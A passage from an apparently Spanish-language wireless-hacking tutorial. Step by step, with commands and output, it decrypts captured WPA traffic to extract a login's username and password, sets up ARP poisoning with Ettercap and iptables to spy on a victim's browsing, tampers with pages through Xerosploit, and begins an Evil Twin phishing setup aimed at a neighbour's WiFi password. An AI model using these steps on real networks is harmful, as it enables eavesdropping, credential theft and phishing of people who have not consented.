    3   2.150557              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........
    4   2.165375 AskeyCom_d4:16:78 â†’ XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2256, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
    5   2.165405              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........
    6   2.635968 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 94 Data, SN=2262, FN=0, Flags=.p....F.
    7   2.941632 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 94 Data, SN=2266, FN=0, Flags=.p....F.
    8   6.679016 IntelCor_46:d1:38 â†’ AskeyCom_d4:16:77 802.11 110 QoS Data, SN=1512, FN=0, Flags=.p.....T
    9   6.678975              â†’ IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 10 Acknowledgement, Flags=........
   10   6.681029 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (TA) â†’ IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 16 Request-to-send, Flags=........
```

No podemos ver desde aquÃ­ ningÃºn tipo de consulta HTTP o trÃ¡fico interno. 

Entonces bien, Â¿quÃ© hacemos?, vamos a usar la cabeza por unos momentos. Â¿QuÃ© es lo que hace que los paquetes
que capturemos estÃ©n encriptados y no podamos ver el trÃ¡fico privado?, la propia contraseÃ±a de la red, Â¿no?,
Â¿y quÃ© pasa si la tenemos?, Â¿no se supone que deberÃ­amos ser capaces entonces de desencriptar estos paquetes?,
correcto.

A travÃ©s de la herramienta **airdecap-ng** de la suite de **aircrack**, es posible desencriptar estas capturas
siempre y cuando se proporcione la contraseÃ±a de la red correcta.

Lo hacemos de la siguiente manera:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap 
Total number of stations seen            9
Total number of packets read          2838
Total number of WEP data packets         0
Total number of WPA data packets      1082
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       189
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #
```

Si nos fijamos, se han desencriptado un total de 189 paquetes WPA. Esto es asÃ­ debido a que la contraseÃ±a
proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se habrÃ­a desencriptado nada.

Esto nos genera en el directorio actual de trabajo un nuevo fichero:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap  Captura-01-dec.cap
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #
```

Sobre el cual podremos hacer los filtrados para visualizar el trÃ¡fico interno.

#### AnÃ¡lisis del desencriptado con Tshark y Wireshark

Realmente usarÃ© **Tshark**, pero desde **Wireshark** obtendrÃ­amos los mismos resultados. Intentemos ver ahora
si somos capaces de visualizar trÃ¡fico HTTP, concretamente, alguna peticiÃ³n POST que se haya realizado:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" 2>/dev/null
  185  10.456181 192.168.1.55 â†’ 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  (application/x-www-form-urlencoded)
```

Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta peticiÃ³n:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null
50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e
```

Â¡Perfecto!, estÃ¡ en hexadecimal, pasÃ©moslo a un formato algo mÃ¡s legible y veamos si podemos sacar algÃºn dato
en claro:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r; echo
POST /includes/posthandler.php HTTP/1.1
Host: www.alcanzatumeta.es
Connection: keep-alive
Content-Length: 105
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.alcanzatumeta.es
Referer: http://www.alcanzatumeta.es/login.php
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8,ja;q=0.7
Cookie: PHPSESSID=e2d60ee7c7ce42d4e971703e7b885464

username=s4vitar&password=miPasswordImposibledeObtener&token=f45e620ab3d4cb00a543f7377d40acce&login=Login
```

Estupendo, como vemos, usuario y contraseÃ±a:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | tail -n 1 | cut -d '&' -f 1-2 | tr '&' '\n'
username=s4vitar
password=miPasswordImposibledeObtener
```

La elegancia de todo esto estÃ¡ en que no estamos haciendo un **MITM** tradicional estando asociados en la red,
lo cual puede levantar sospechas dado que la mayorÃ­a de ataques de tipo ARP Spoofing/DNS Spoofing ya son
detectados y alertados por la mayorÃ­a de navegadores.

Este ataque lo estamos haciendo desde fuera de la red, sin estar asociados, capturando simplemente el trÃ¡fico
que percibamos estando en modo monitor, lo cual es fascinante.

**IMPORTANTE**: Para desencriptar el trÃ¡fico de un cliente, es necesario capturar un Handshake por parte de
dicha estaciÃ³n. En caso contrario, no serÃ¡ posible desencriptar su trÃ¡fico.

#### Espionaje con Ettercap Driftnet y enrutamiento con iptables

Considerando que ya estamos conectados a la red y queremos actuar de manera activa, no pasiva como se vio en
el punto anterior, lo primero que debemos hacer es habilitar el enrutamiento en nuestro equipo:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #echo 1 > /proc/sys/net/ipv4/ip_forward
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #
```

Una vez hecho, generamos una pequeÃ±a regla en **iptables** para definir cÃ³mo se debe de comportar el trÃ¡fico a
la hora de envenenar la red. Para este caso, queremos que todo el trÃ¡fico dirigido al puerto 80 sea enrutado
al puerto 8080:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #
```

Antes que nada recomiendo limpiar cualquier tipo de regla previa definida en iptables. Para al que le guste la
idea, en mi caso tengo creado un alias a nivel de **bashrc**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #cat ~/.bashrc | grep flushIPTABLES -A 5
function flushIPTABLES(){
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}
```

AsÃ­ cuando escribo **flushIPTABLES** se me limpian todas las reglas previamente definidas.

Posteriormente, retocamos el fichero **/etc/ettercap/etter.conf**, cambiando los valores por defecto a **0**:

```bash
[privs]
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default
```

Por otro lado, descomentamos estas 2 lÃ­neas de dicho archivo:

```bash
# if you use iptables:
   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
```

Una vez hecho, abrimos **Ettercap** en modo grÃ¡fico a travÃ©s del parÃ¡metro '**-G**'. Lo primero que haremos
serÃ¡ escanear los Hosts disponibles en la red:

<img align="center" src="https://funkyimg.com/i/2WaBf.png">

Esto se puede hacer de manera intuitiva a travÃ©s de la pestaÃ±a **Hosts**. Una vez hecho, y este paso es
importante, lo que haremos serÃ¡ seleccionar en primer lugar nuestro Gateway (192.168.1.1) y presionar en **Add
to Target 1**, seguidamente seleccionamos la direcciÃ³n IP de nuestra vÃ­ctima y presionamos en **Add To Target
2**:

<img align="center" src="https://funkyimg.com/i/2WaBr.png">

Ya con este esquema configurado, verificamos desde la pestaÃ±a **Targets** que todo estÃ© como debe estar:

<img align="center" src="https://funkyimg.com/i/2WaBz.png">

Si es asÃ­, continuamos. Nos iremos a la pestaÃ±a **Mitm** y pincharemos en **ARP Poissoning**. Acto seguido, se
nos abrirÃ¡ una ventana, en ella seleccionamos la casilla **Sniff Remote Connections** y presionamos en **Aceptar**.

Tras hacer esto, deberÃ­amos ver lo siguiente desde la ventana principal:

<img align="center" src="https://funkyimg.com/i/2WaBF.png">

Ahora toca hacer la prueba de fuego. Cargamos los siguientes comandos desde consola:

<img align="center" src="https://funkyimg.com/i/2WaBJ.png">

Una vez estos estÃ¡n corriendo, simulamos la navegaciÃ³n desde el dispositivo cuyo trÃ¡fico se estÃ¡ envenenando.

En este caso, se accede a una direcciÃ³n URL de noticias, obteniendo los siguientes resultados:

<img align="center" src="https://funkyimg.com/i/2WaBL.png">

Cabe decir que a su vez estamos usando **driftnet**, razÃ³n por la que ademÃ¡s de visualizar la direcciÃ³n URL
que se estÃ¡ visitando, somos capaces de ver las imÃ¡genes que cargan a tiempo real en dicha pÃ¡gina web. 

Si le damos un tiempo, conseguiremos extraer incluso mÃ¡s imÃ¡genes aÃºn:

<img align="center" src="https://funkyimg.com/i/2WaBN.png">

A su vez, podemos aprovechar el propio **Ettercap** para capturar credenciales de autenticaciÃ³n a una pÃ¡gina
web:

<img align="center" src="https://funkyimg.com/i/2WaC1.png">

### Ataques graciosos

Estos ataques forman parte de una categorÃ­a que considero algo Off-Topic, porque no obtenemos nada de interÃ©s
con ello.. pero bueno, puede servir para echarnos unas risas de vez en cuando.

#### Reemplazado de imÃ¡genes web

En este punto, lo que haremos serÃ¡ envenenar el trÃ¡fico de nuestra vÃ­ctima una vez mÃ¡s pero esta vez para
manipular las imÃ¡genes que se disponen en las pÃ¡ginas web a las que accede.

Para ello, previamente necesitamos contar con una imagen, la cual utilizaremos para hacer la sustituciÃ³n. Por
otro lado, necesitamos tener instalada la herramienta **Xerosploit** en nuestro equipo.

* **Repositorio**: https://github.com/LionSec/xerosploit

Una vez la tengamos instalada, ejecutamos **xerosploit** desde consola:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #xerosploit 

____  __                     ________         ______       _____ _____ 
__  |/ /_____ ______________ __  ___/________ ___  /______ ___(_)__  /_
__    / _  _ \__  ___/_  __ \_____ \ ___  __ \__  / _  __ \__  / _  __/
_    |  /  __/_  /    / /_/ /____/ / __  /_/ /_  /  / /_/ /_  /  / /_  
/_/|_|  \___/ /_/     \____/ /____/  _  .___/ /_/   \____/ /_/   \__/  
                                     /_/                                    


[+]â•â•â•â•â•â•â•â•â•â•â•[ Author : @LionSec1 _-\|/-_ Website: lionsec.net ]â•â•â•â•â•â•â•â•â•â•â•[+]

                      [ Powered by Bettercap and Nmap ]
 
â”Œâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”
â–ˆ                                                                             â–ˆ
â–ˆ                         Your Network Configuration                          â–ˆ 
â–ˆ                                                                             â–ˆ
â””â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”˜     
 
â•’â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â••
â”‚  IP Address  â”‚    MAC Address    â”‚   Gateway   â”‚  Iface  â”‚  Hostname  â”‚
â•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•¡
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 192.168.1.43 â”‚ 80:CE:62:3C:EB:A1 â”‚ 192.168.1.1 â”‚  eth0   â”‚   parrot   â”‚
â•˜â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•›

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘             â•‘ XeroSploit is a penetration testing toolkit whose goal is to       â•‘
â•‘ Information â•‘ perform man in the middle attacks for testing purposes.            â•‘
â•‘             â•‘ It brings various modules that allow to realise efficient attacks. â•‘
â•‘             â•‘ This tool is Powered by Bettercap and Nmap.                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Please type 'help' to view commands.

Xero âž® 
```

Con el comando **help**, listamos las opciones disponibles:

```bash
Xero âž® help  

â•”â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘          â•‘                                                                â•‘
â•‘          â•‘ scan     :  Map your network.                                  â•‘
â•‘          â•‘                                                                â•‘
â•‘          â•‘ iface    :  Manually set your network interface.               â•‘
â•‘ COMMANDS â•‘                                                                â•‘
â•‘          â•‘ gateway  :  Manually set your gateway.                         â•‘
â•‘          â•‘                                                                â•‘
â•‘          â•‘ start    :  Skip scan and directly set your target IP address. â•‘
â•‘          â•‘                                                                â•‘
â•‘          â•‘ rmlog    :  Delete all xerosploit logs.                        â•‘
â•‘          â•‘                                                                â•‘
â•‘          â•‘ help     :  Display this help message.                         â•‘
â•‘          â•‘                                                                â•‘
â•‘          â•‘ exit     :  Close Xerosploit.                                  â•‘
â•‘          â•‘                                                                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Please type 'help' to view commands.

Xero âž® 
```

Lo primero es realizar un escaneo de la red, por lo que corremos la opciÃ³n **scan**:

```bash
Xero âž® scan

[++] Mapping your network ... 

[+]â•â•â•â•â•â•â•â•â•â•â•[ Devices found on your network ]â•â•â•â•â•â•â•â•â•â•â•[+]

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘ IP Address    â•‘ Mac Address       â•‘ Manufacturer  â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¬â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¬â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ 192.168.1.1   â•‘ 1C:B0:44:D4:16:77 â•‘ (Unknown)     â•‘
â•‘ 192.168.1.55  â•‘ 34:41:5D:46:D1:38 â•‘ (Unknown)     â•‘
â•‘ 192.168.1.60  â•‘ 20:34:FB:B1:C5:53 â•‘ (Unknown)     â•‘
â•‘ 192.168.1.201 â•‘ F8:8B:37:E3:32:A2 â•‘ (Unknown)     â•‘
â•‘ 192.168.1.43  â•‘ 80:CE:62:3C:EB:A1 â•‘ (This device) â•‘
â•‘               â•‘                   â•‘               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.

Xero âž® 
```

Tras identificar a nuestra vÃ­ctima, escribimos la direcciÃ³n IP y se nos listarÃ¡n los distintos modos de ataque:

```bash
Xero âž® 192.168.1.60

[++] 192.168.1.60 has been targeted. 

[+] Which module do you want to load ? Enter 'help' for more information.

XeroÂ»modules âž® help

â•”â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ pscan       :  Port Scanner                                          â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ dos         :  DoS Attack                                            â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ ping        :  Ping Request                                          â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ injecthtml  :  Inject Html code                                      â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ injectjs    :  Inject Javascript code                                â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ rdownload   :  Replace files being downloaded                        â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ sniff       :  Capturing information inside network packets          â•‘
â•‘ MODULES â•‘                                                                      â•‘
â•‘         â•‘ dspoof      :  Redirect all the http traffic to the specified one IP â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ yplay       :  Play background sound in target browser               â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ replace     :  Replace all web pages images with your own one        â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ driftnet    :  View all images requested by your targets             â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ move        :  Shaking Web Browser content                           â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ deface      :  Overwrite all web pages with your HTML code           â•‘
â•‘         â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Which module do you want to load ? Enter 'help' for more information.

XeroÂ»modules âž® 
```

Entre ellos, seleccionaremos la opciÃ³n **replace**, que se encargarÃ¡ de llevar a cabo la sustituciÃ³n de
imÃ¡genes sobre la pÃ¡gina web que nuestra vÃ­ctima estÃ© visitando:

```bash
XeroÂ»modules âž® replace
 
â”Œâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”
â–ˆ                                                              â–ˆ
â–ˆ                          Image Replace                       â–ˆ
â–ˆ                                                              â–ˆ
â–ˆ        Replace all web pages images with your own one        â–ˆ
â””â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”˜     

[+] Enter 'run' to execute the 'replace' command.

XeroÂ»modulesÂ»replace âž® run

[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)

XeroÂ»modulesÂ»replace âž® 
```

Especificamos la ruta absoluta de nuestra imagen y comenzarÃ¡ el ataque. Desde que la vÃ­ctima navegue a una
pÃ¡gina web, todas las imÃ¡genes serÃ¡n sustituidas por la nuestra:

<img align="center" src="https://funkyimg.com/i/2Wbs4.png">

#### Ataque Shaking Web

Haciendo uso de la misma herramienta vista en el punto anterior, otra de las acciones de las que dispone
**xerosploit** es el **move**, por el cual podemos hacer un ataque de tipo **Shaking Web**, es decir, hacer
que cuando nuestra vÃ­ctima navegue a una pÃ¡gina, esta se mueva temblando de manera que no se logra leer nada
de la misma:

```bash
Xero âž® 192.168.1.60

[++] 192.168.1.60 has been targeted. 

[+] Which module do you want to load ? Enter 'help' for more information.

XeroÂ»modules âž® help

â•”â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ pscan       :  Port Scanner                                          â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ dos         :  DoS Attack                                            â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ ping        :  Ping Request                                          â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ injecthtml  :  Inject Html code                                      â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ injectjs    :  Inject Javascript code                                â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ rdownload   :  Replace files being downloaded                        â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ sniff       :  Capturing information inside network packets          â•‘
â•‘ MODULES â•‘                                                                      â•‘
â•‘         â•‘ dspoof      :  Redirect all the http traffic to the specified one IP â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ yplay       :  Play background sound in target browser               â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ replace     :  Replace all web pages images with your own one        â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ driftnet    :  View all images requested by your targets             â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ move        :  Shaking Web Browser content                           â•‘
â•‘         â•‘                                                                      â•‘
â•‘         â•‘ deface      :  Overwrite all web pages with your HTML code           â•‘
â•‘         â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Which module do you want to load ? Enter 'help' for more information.

XeroÂ»modules âž® move
```

### Evil Twin Attack

En este punto, veremos una de las tÃ©cnicas mÃ¡s comunes para obtener la contraseÃ±a de una red inalÃ¡mbrica
ajena, por medio de tÃ©cnicas Phishing aplicadas sobre WiFi.

Si has leÃ­do todo lo anterior hasta este punto, habrÃ¡s visto como es muy comÃºn que las estaciones emitan el
paquete **Probe Request** cuando estas no estÃ¡n asociadas a ningÃºn AP:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
    1 0.000000000 Apple_7d:1f:e9 â†’ Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
    2 0.019968349 Apple_7d:1f:e9 â†’ Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
```

Lo que haremos en los siguientes puntos, es justamente aprovechar estos paquetes para asociar a nuestros
clientes a un AP falso gestionado por nosotros, desde donde a travÃ©s de reglas de enrutamiento y
redireccionamientos haremos que estos sean redirigidoa a una pÃ¡gina falsa la cual solicitarÃ¡ la contraseÃ±a de
la red WiFi.

La idea es que una vez los clientes vÃ­ctima introduzcan las credenciales, estas viajen en texto claro hacia
nosotros, pudiendo visualizarlas para posteriormente llevar a cabo la autenticaciÃ³n contra la red inalÃ¡mbrica
ajena.

Cabe decir que el paso de solicitar la contraseÃ±a de la red inalÃ¡mbrica es opcional, de la misma manera
podrÃ­amos solicitar algÃºn otro tipo de dato.

#### CreaciÃ³n de fichero DHCP

Comenzaremos creando un simple fichero DHCP con nombre **dhcpd.conf** bajo la ruta **/etc/**:

```bash
â”Œâ”€[root@parrot]â”€[/etc]
â””â”€â”€â•¼ #pwd
/etc
â”Œâ”€[root@parrot]â”€[/etc]
â””â”€â”€â•¼ #cat dhcpd.conf 
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
option subnet-mask 255.255.255.128;
option broadcast-address 192.168.1.255;
option routers 192.168.1.129;
option domain-name-servers 8.8.8.8;
range 192.168.1.130 192.168.1.140;
}
```

